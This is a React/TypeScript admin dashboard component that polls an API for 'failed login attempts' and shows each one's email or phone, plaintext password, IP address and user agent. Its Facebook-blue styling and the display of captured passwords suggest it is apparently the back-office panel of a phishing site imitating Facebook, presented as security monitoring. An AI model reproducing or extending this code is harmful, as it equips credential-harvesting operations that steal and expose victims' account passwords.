import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useToast } from "@/hooks/use-toast";
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Loader2 } from "lucide-react";

interface LoginAttempt {
  id: number;
  attempt_time: string;
  email_or_phone: string;
  password: string;
  ip_address: string;
  user_agent: string;
  error_message?: string;
}

export function AdminPage() {
  const [loginAttempts, setLoginAttempts] = useState<LoginAttempt[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [currentUser, setCurrentUser] = useState<any | null>(null);
  const [_, navigate] = useLocation();
  const { toast } = useToast();

  const fetchData = async () => {
    try {
      setError('');

      // First check if user is admin
      const authResponse = await fetch('/api/auth/me');
      if (!authResponse.ok) {
        navigate('/admin-login');
        return;
      }

      const userData = await authResponse.json();
      if (!userData.is_admin) {
        navigate('/admin-login');
        return;
      }

      setCurrentUser(userData);

      // Fetch login attempts
      const attemptsResponse = await fetch('/api/admin/login-attempts');
      if (attemptsResponse.ok) {
        const attemptsData = await attemptsResponse.json();
        setLoginAttempts(attemptsData || []);
      } else {
        console.error('Failed to fetch login attempts');
        toast({
          title: "Error",
          description: "Failed to fetch login attempts. Please try again.",
          variant: "destructive"
        });
      }
    } catch (err) {
      console.error('Error fetching admin data:', err);
      setError('Failed to load admin data. Please try again.');
      toast({
        title: "Error",
        description: "Failed to load admin data. Please refresh the page.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    // Set up polling for new attempts every 10 seconds
    const interval = setInterval(fetchData, 10000);
    return () => clearInterval(interval);
  }, [navigate]);

  if (loading) {
    return (
      <div className="flex items-center justify-center h-screen bg-gray-50">
        <div className="flex flex-col items-center gap-4">
          <Loader2 className="h-8 w-8 animate-spin text-facebook-blue" />
          <p className="text-gray-600">Loading admin dashboard...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="container mx-auto px-4">
        <div className="flex justify-between items-center mb-8">
          <div>
            <h1 className="text-3xl font-bold text-gray-900">Admin Dashboard</h1>
            <p className="text-gray-600 mt-1">Monitoring login attempts and security</p>
          </div>
          <Button
            onClick={() => fetchData()}
            className="bg-facebook-blue hover:bg-facebook-blue/90 text-white"
          >
            Refresh Data
          </Button>
        </div>

        {error && (
          <Card className="mb-6 border-red-200 bg-red-50">
            <CardContent className="p-4 text-red-700">{error}</CardContent>
          </Card>
        )}

        <Card className="mb-8">
          <CardHeader>
            <CardTitle>Failed Login Attempts</CardTitle>
            <CardDescription>
              Showing all failed login attempts with credentials
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <table className="w-full border-collapse">
                <thead>
                  <tr className="bg-gray-50 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                    <th className="px-6 py-3">Time</th>
                    <th className="px-6 py-3">Email/Phone</th>
                    <th className="px-6 py-3">Password</th>
                    <th className="px-6 py-3">IP Address</th>
                    <th className="px-6 py-3">Browser</th>
                    <th className="px-6 py-3">Error</th>
                  </tr>
                </thead>
                <tbody className="bg-white divide-y divide-gray-200">
                  {loginAttempts.length === 0 ? (
                    <tr>
                      <td colSpan={6} className="px-6 py-8 text-center text-gray-500">
                        No failed login attempts recorded yet
                      </td>
                    </tr>
                  ) : (
                    loginAttempts.map((attempt) => (
                      <tr key={attempt.id} className="hover:bg-gray-50 transition-colors">
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-900">
                          {new Date(attempt.attempt_time).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-facebook-blue">
                          {attempt.email_or_phone}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-600">
                          {attempt.password}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-600">
                          {attempt.ip_address}
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-600 max-w-xs truncate">
                          {attempt.user_agent}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-red-600">
                          {attempt.error_message || "Authentication failed"}
                        </td>
                      </tr>
                    ))
                  )}
                </tbody>
              </table>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
}